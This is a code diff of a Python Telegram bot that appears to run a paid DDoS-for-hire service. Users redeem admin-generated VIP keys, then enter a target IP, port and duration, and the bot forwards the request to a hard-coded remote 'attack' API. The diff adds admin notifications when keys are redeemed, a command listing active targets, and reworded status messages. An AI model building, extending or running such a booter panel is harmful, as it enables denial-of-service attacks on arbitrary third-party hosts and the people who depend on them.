@@ -9,7 +9,7 @@ import requests
 from flask import Flask
 from telebot import types
 
-# --- FLASK FOR RAILWAY HEALTH CHECK ---
+# --- FLASK FOR RAILWAY ---
 app = Flask('')
 @app.route('/')
 def home(): return "Bot is Online"
@@ -25,10 +25,10 @@ API_URL = "http://13.203.155.253/attack"
 
 bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")
 
-# --- GLOBAL TRACKING (CONCURRENCY & SLOTS) ---
+# --- GLOBAL TRACKING ---
 MAX_CONCURRENT = 2
 running_attacks = 0
-attack_slots = {} # Tracking live attacks for animation
+attack_slots = {} 
 
 # --- DATABASE ---
 def load_data(file, default):
@@ -44,7 +44,7 @@ def save_data(file, data):
 users = load_data("users.json", {})
 keys = load_data("keys.json", {})
 
-# --- START ---
+# --- START COMMAND ---
 @bot.message_handler(commands=['start'])
 def start(message):
     uid = str(message.from_user.id)
@@ -53,20 +53,13 @@ def start(message):
         save_data("users.json", users)
     
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    markup.add("🚀 ATTACK", "👤 PROFILE", "🎫 REDEEM", "📊 STATUS")
+    markup.add("🚀 ATTACK", "📊 STATUS", "👤 PROFILE", "🎫 REDEEM")
     
-    bot.send_message(message.chat.id, f"🚀 **WELCOME TO SASTA DEVELOPER TERMINAL**\n\n**Slots Available:** `{MAX_CONCURRENT - running_attacks}/{MAX_CONCURRENT}`", reply_markup=markup)
-
-# --- STATUS COMMAND ---
-@bot.message_handler(func=lambda m: m.text == "📊 STATUS")
-def status(message):
-    msg = f"🛰️ **SYSTEM STATUS**\n━━━━━━━━━━━━━━\n"
-    msg += f"🔥 **Active Attacks:** `{running_attacks}`\n"
-    msg += f"✅ **Available Slots:** `{MAX_CONCURRENT - running_attacks}`\n"
-    for uid, info in attack_slots.items():
-        rem = int(info['end'] - time.time())
-        msg += f"⏳ `{info['target']}` | `{rem}s left`\n"
-    bot.send_message(message.chat.id, msg)
+    bot.send_message(message.chat.id, 
+        f"🚀 **WELCOME TO SASTA DEVELOPER V3**\n\n"
+        f"**Available Slots:** `{MAX_CONCURRENT - running_attacks}/{MAX_CONCURRENT}`\n"
+        f"**Your Rank:** `{'ADMIN' if int(uid) == ADMIN_ID else 'VIP' if users[uid]['expiry'] > time.time() else 'FREE'}`", 
+        reply_markup=markup)
 
 # --- ATTACK SYSTEM ---
 @bot.message_handler(func=lambda m: m.text == "🚀 ATTACK")
@@ -74,29 +67,28 @@ def attack_req(message):
     global running_attacks
     uid = str(message.from_user.id)
     
-    # Expiry Check
     if users.get(uid, {}).get('expiry', 0) < time.time() and int(uid) != ADMIN_ID:
-        bot.reply_to(message, "🚫 **No VIP Access!**"); return
+        bot.reply_to(message, "🚫 **Access Denied!** Please redeem a VIP key."); return
     
-    # Concurrency Limit (Strictly 2)
     if running_attacks >= MAX_CONCURRENT and int(uid) != ADMIN_ID:
-        bot.reply_to(message, f"⚠️ **ALL SLOTS FULL!**\nWait for an ongoing attack to finish.\n\nSlots: `{running_attacks}/{MAX_CONCURRENT}`")
-        return
+        bot.reply_to(message, f"⚠️ **ALL SLOTS BUSY!**\nWait for an attack to finish.\nSlots: `{running_attacks}/{MAX_CONCURRENT}`"); return
     
-    msg = bot.send_message(message.chat.id, "🎯 **Enter Target:** `IP PORT TIME`")
+    msg = bot.send_message(message.chat.id, "🎯 **Enter Target:** `IP PORT TIME` (Example: `1.1.1.1 80 60`)")
     bot.register_next_step_handler(msg, run_attack_logic)
 
 def run_attack_logic(message):
     global running_attacks
     uid = str(message.from_user.id)
     try:
-        ip, port, duration = message.text.split()
+        parts = message.text.split()
+        if len(parts) != 3: raise ValueError
+        ip, port, duration = parts
         duration_int = int(duration)
         
         running_attacks += 1
-        attack_slots[uid] = {"target": f"{ip}:{port}", "end": time.time() + duration_int}
+        attack_slots[uid] = {"target": f"{ip}:{port}", "end": time.time() + duration_int, "user": message.from_user.first_name}
 
-        sent = bot.send_message(message.chat.id, "🚀 **INITIALIZING ATTACK...**")
+        sent = bot.send_message(message.chat.id, "⚙️ **Connecting to API...**")
         
         def call_api():
             global running_attacks
@@ -115,30 +107,19 @@ def run_attack_logic(message):
             
             time.sleep(duration_int)
             
-            # Attack End Animation & Slot Release
+            # End Animation
             running_attacks -= 1
             attack_slots.pop(uid, None)
-            bot.send_message(message.chat.id, f"✅ **ATTACK FINISHED** ✅\n━━━━━━━━━━━━━━\n🎯 **Target:** `{ip}:{port}`\n💎 **Slot Released!**")
+            bot.send_message(message.chat.id, f"✅ **ATTACK FINISHED** ✅\n━━━━━━━━━━━━━━\n🎯 **Target:** `{ip}:{port}`\n💎 **Slot Released Successfully!**")
 
         threading.Thread(target=call_api).start()
     except:
-        bot.reply_to(message, "❌ **Error!** Use: `IP PORT TIME`")
+        bot.reply_to(message, "❌ **Invalid Format!** Please use `IP PORT TIME`.")
 
-# --- ADMIN COMMANDS ---
-@bot.message_handler(commands=['genkey'])
-def genkey(message):
-    if message.from_user.id != ADMIN_ID: return
-    try:
-        days = int(message.text.split()[1])
-        key = "SD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
-        keys[key] = days * 86400
-        save_data("keys.json", keys)
-        bot.reply_to(message, f"🎫 **KEY:** `{key}`")
-    except: bot.reply_to(message, "`/genkey <days>`")
-
+# --- REDEEM & ADMIN ALERTS ---
 @bot.message_handler(func=lambda m: m.text == "🎫 REDEEM")
 def redeem(message):
-    msg = bot.send_message(message.chat.id, "⌨️ **Enter Key:**")
+    msg = bot.send_message(message.chat.id, "⌨️ **Enter your VIP Key:**")
     bot.register_next_step_handler(msg, process_redeem)
 
 def process_redeem(message):
@@ -149,18 +130,52 @@ def process_redeem(message):
         users[uid]['expiry'] = max(users[uid].get('expiry', 0), time.time()) + duration
         save_data("users.json", users)
         save_data("keys.json", keys)
-        bot.send_message(message.chat.id, "✅ **VIP ACTIVATED!**")
-    else: bot.send_message(message.chat.id, "❌ **Invalid Key!**")
+        
+        # Admin Notification
+        bot.send_message(ADMIN_ID, f"🔔 **KEY REDEEMED!**\n👤 **User:** `{message.from_user.first_name}`\n🆔 **ID:** `{uid}`\n🔑 **Key:** `{key}`\n⏳ **Added:** `{duration//86400} Days`")
+        
+        bot.send_message(message.chat.id, "✅ **VIP ACTIVATED!** Enjoy your access.")
+    else:
+        bot.reply_to(message, "❌ **Invalid or Expired Key!**")
+
+# --- ADMIN COMMANDS ---
+@bot.message_handler(commands=['genkey'])
+def genkey(message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        days = int(message.text.split()[1])
+        key = "SD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
+        keys[key] = days * 86400
+        save_data("keys.json", keys)
+        bot.reply_to(message, f"🎫 **NEW KEY:** `{key}`\n⏳ **Duration:** `{days} Days`")
+    except: bot.reply_to(message, "Usage: `/genkey <days>`")
+
+@bot.message_handler(commands=['running'])
+def show_running(message):
+    if message.from_user.id != ADMIN_ID: return
+    if not attack_slots:
+        bot.reply_to(message, "🛰️ No active attacks."); return
+    msg = "🚀 **ACTIVE ATTACKS**\n\n"
+    for uid, info in attack_slots.items():
+        msg += f"👤 `{info['user']}` -> `{info['target']}`\n"
+    bot.send_message(message.chat.id, msg)
+
+@bot.message_handler(func=lambda m: m.text == "📊 STATUS")
+def status(message):
+    msg = f"📊 **SYSTEM STATUS**\n━━━━━━━━━━━━━━\n"
+    msg += f"🔥 **Active Slots:** `{running_attacks}/{MAX_CONCURRENT}`\n"
+    msg += f"🟢 **System:** `Online`"
+    bot.send_message(message.chat.id, msg)
 
 @bot.message_handler(func=lambda m: m.text == "👤 PROFILE")
 def profile(message):
     uid = str(message.from_user.id)
     rem = int(users.get(uid, {}).get('expiry', 0) - time.time())
     days = max(0, rem // 86400)
-    bot.send_message(message.chat.id, f"👤 **USER:** `{users[uid]['name']}`\n⏳ **EXPIRY:** `{days} Days`")
+    bot.send_message(message.chat.id, f"👤 **Profile:** `{users[uid]['name']}`\n🆔 **ID:** `{uid}`\n⏳ **VIP Remaining:** `{days} Days`")
 
-# --- EXECUTION ---
+# --- MAIN ---
 if __name__ == "__main__":
-    threading.Thread(target=run_web).start() # For Railway
-    print(">>> BOT STARTED SUCCESSFULLY!")
+    threading.Thread(target=run_web).start() # Health Check
+    print(">>> SASTA DEVELOPER BOT IS LIVE!")
     bot.infinity_polling(skip_pending=True)
